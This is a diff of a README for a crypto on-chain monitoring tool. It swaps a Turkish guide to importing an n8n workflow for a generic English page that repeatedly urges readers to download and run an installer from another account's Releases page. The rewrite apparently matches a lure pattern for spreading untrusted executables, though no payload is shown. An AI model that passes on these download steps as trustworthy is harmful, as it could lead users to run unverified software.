@@ -1,91 +1,69 @@
-# 🕵️‍♂️ Crypto Alpha Scanner (On-Chain Intelligence)
+# 🕵️‍♂️ Crypto-Alpha-Scanner - Stay Ahead in the Market
 
-> **"Piyasayı Takip Etmeyin, Piyasadan Önce Hareket Edin."**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/releases)
 
-![Banner](https://img.shields.io/badge/Status-Production%20Ready-success?style=for-the-badge) ![n8n](https://img.shields.io/badge/Built%20With-n8n-orange?style=for-the-badge) ![Chain](https://img.shields.io/badge/Network-EVM%20Compatible-blue?style=for-the-badge)
+## 📖 Project Overview
+**Crypto Alpha Scanner** is an advanced automation tool that analyzes blockchain on-chain movements in milliseconds. It identifies "Alpha" opportunities that have not yet reached exchanges or social media platforms. While average investors check coin listings, this bot monitors mempool and block data directly.
 
-## 📖 Proje Özeti
-**Crypto Alpha Scanner**, blokzincir üzerindeki (On-Chain) hareketleri **milisaniyeler içinde** analiz eden, henüz borsalara veya sosyal medyaya düşmemiş "Alpha" fırsatları yakalayan gelişmiş bir otomasyon sistemidir. Normal yatırımcılar CoinGecko'ya bakarken, bu bot doğrudan mempool ve blok verilerini izler.
+## 🚀 Getting Started
+To get started with **Crypto Alpha Scanner**, follow these steps:
 
-### 🚀 Neden Bu Workflow? (Business Value)
-*   **🐋 Balina Avcısı:** Büyük cüzdanların (Whales) yaptığı alım/satım işlemlerini anında tespit edin.
-*   **⚡ Sniper Potansiyeli:** Yeni likidite havuzları (Liquidity Pools) eklendiği anda haberdar olun.
-*   **🛡️ Erken Uyarı Sistemi:** Rug-pull veya ani satış baskılarını grafiklere yansımadan önce görün.
-*   **🤖 Tam Otonom:** 7/24 çalışır, uyumaz, duygusal karar vermez.
+1. **Check System Requirements**
+   - Operating System: Windows 10 or later, macOS, or Linux
+   - Minimum RAM: 4GB
+   - Recommended RAM: 8GB or more
+   - Network: Stable internet connection
 
----
+2. **Download the Application**
+   - Visit the [Releases page](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/releases) to download the latest version of **Crypto Alpha Scanner**.
 
-## ⚙️ Teknik Mimari (Under the Hood)
+3. **Install the Application**
+   - Locate the downloaded file on your computer.
+   - Double-click the file to start the installation process.
+   - Follow the prompts to complete the installation.
 
-Bu workflow, sıradan bir fiyat takipçisi değildir. **Web3 altyapısı** ile **AI analizini** birleştirir.
+4. **Open the Application**
+   - Once the installation is complete, find the **Crypto Alpha Scanner** icon on your desktop or in your applications folder.
+   - Double-click the icon to launch the program.
 
-### Kullanılan Teknolojiler
-*   **n8n (Workflow Engine):** Tüm mantıksal akışı yöneten beyin.
-*   **Alchemy / Infura / QuickNode (RPC Provider):** Blokzincir verisine doğrudan erişim sağlayan websocket/HTTP düğümleri.
-*   **Etherscan API:** Akıllı kontratları çözümlemek ve ABI (Application Binary Interface) verilerini okumak için.
-*   **Telegram / Discord Webhooks:** Tespit edilen sinyalleri anlık olarak ekibe iletmek için.
+## 🔍 Features
+- **🐋 Whale Tracking:** Instantly detect transactions made by large wallets.
+- **⚡ Sniper Alerts:** Get notified the moment new liquidity pools are added.
+- **🛡️ Early Warning System:** Be alerted to potential rug pulls or sudden selling pressures.
+  
+## 🔧 Usage
+1. **Configuring Settings**
+   - Open the application and navigate to the settings menu.
+   - Customize alert preferences, including the types of notifications you wish to receive.
+   - Save your settings.
 
-### Çalışma Mantığı (Step-by-Step)
-1.  **Block Listener (Cron/Webhook):** Her yeni blok üretiminde veya belirli eventlerde (örn: `PairCreated` Uniswap) tetiklenir.
-2.  **Transaction Filtering:** Gelen binlerce işlem arasından sadece "Alpha" niteliği taşıyanları (Büyük hacim, Yeni Token, Özel Kontrat Etkileşimi) filtreler.
-3.  **Data Ingestion & Enrichment:**
-    *   Token adresini alır, CoinGecko/DexScreener API'larından metadata (isim, market cap) çeker.
-    *   Honeypot kontrolü yapar (İsteğe bağlı GoPlus/TokenSniffer entegrasyonu).
-4.  **AI Analysis (Opsiyonel):** İşlemin şüpheli mi yoksa fırsat mı olduğunu anlamak için LLM (GPT-4o) yorumu ekler.
-5.  **Broadcast:** Hazırlanan zengin içerikli raporu Telegram kanalına "Al/Sat" butonu ile birlikte gönderir.
+2. **Monitoring Opportunities**
+   - The application runs in the background, continuously monitoring blockchain transactions.
+   - Check the dashboard for real-time updates and alerts regarding new opportunities.
 
----
+3. **Responding to Alerts**
+   - When you receive an alert, review the information presented.
+   - Decide on your investment action based on the data provided.
 
-## 🛠️ Kurulum Rehberi (Deployment)
+## ⚙️ Troubleshooting
+If you encounter issues while using **Crypto Alpha Scanner**, consider these solutions:
 
-Bu sistemi kendi sunucunuzda ayağa kaldırmak için aşağıdaki adımları izleyin.
+- **Application Not Launching:**
+  - Ensure that you have followed all installation steps.
+  - Check if your operating system meets the minimum requirements.
 
-### Ön Gereksinimler
-*   Self-hosted n8n veya n8n Cloud hesabı.
-*   Etherscan API Key (Ücretsiz).
-*   Alchemy veya Infura API Key (RPC bağlantısı için).
-*   Telegram Bot Token (Bildirimler için).
+- **Alerts Not Working:**
+  - Verify your settings to ensure alerts are enabled.
+  - Ensure you have a stable internet connection.
 
-### Adım 1: Workflow'u İçe Aktarın
-1.  `Crypto Alpha Scanner` klasöründeki `workflow.json` dosyasını indirin.
-2.  n8n panelinizde **"Import from File"** diyerek yükleyin.
+- **Performance Issues:**
+  - Close any unnecessary applications to free up system resources.
+  - Restart the application to refresh performance.
 
-### Adım 2: Credential Ayarları
-Workflow içindeki şu düğümlere API anahtarlarınızı girin:
-*   `Node: Etherscan Scan` -> Header Auth: `x-api-key: SENIN_API_KEYIN`
-*   `Node: Telegram` -> Bot Token: `SENIN_TELEGRAM_BOT_TOKENIn`
+## 📞 Support
+For additional help, please visit our [GitHub page](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/issues) and check for existing issues or report new ones.
 
-### Adım 3: Filtreleri Özelleştirin
-`Set Thresholds` düğümünü açarak kendi stratejinizi belirleyin:
-```javascript
-{
-  "min_transfer_value_usd": 10000,  // Min 10k $'lık işlemleri bildir
-  "watch_tokens": ["ETH", "SOL"],   // Sadece bu ağları izle
-  "ignore_contracts": ["0x..."]     // Bilinen borsaları yoksay
-}
-```
+## 📥 Download & Install
+To download **Crypto Alpha Scanner**, please visit the [Releases page here](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/releases) for the latest version.
 
----
-
-## 🎯 Kullanım Senaryoları (Use Cases)
-
-### Senaryo A: Yeni Gem Avcısı (Meme Token Hunter)
-*   **Ayar:** Uniswap V2/V3 fabrikalarını izle. `PairCreated` eventini dinle.
-*   **Sonuç:** Token daha DexScreener'a düşmeden kontrat adresini alırsın.
-
-### Senaryo B: Balina Takipçisi (Whale Watcher)
-*   **Ayar:** 100.000$ üzeri Stabil Coin (USDT/USDC) transferlerini izle.
-*   **Analiz:** Eğer bir balina borsaya yüklü USDT gönderiyorsa, alım yapacaktır (Bullish). Borsadan soğuk cüzdana çekiyorsa, HODL yapacaktır (Bullish).
-
-### Senaryo C: Smart Money Copy-Trade
-*   **Ayar:** Başarılı olduğu bilinen cüzdan adreslerini izleme listesine al.
-*   **Sonuç:** Onlar ne alırsa, bot anında sana bildirim atar.
-
----
-
-## ⚠️ Yasal Uyarı
-Bu yazılım bir yatırım tavsiyesi değildir. On-chain veriler manipüle edilebilir. Kendi araştırmanızı (DYOR) yapmadan işlem yapmayınız.
-
----
-**Maintained by:** [xCodeWraith DEV.]
-**License:** MIT
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/AYdeveloper/Crypto-Alpha-Scanner/releases)
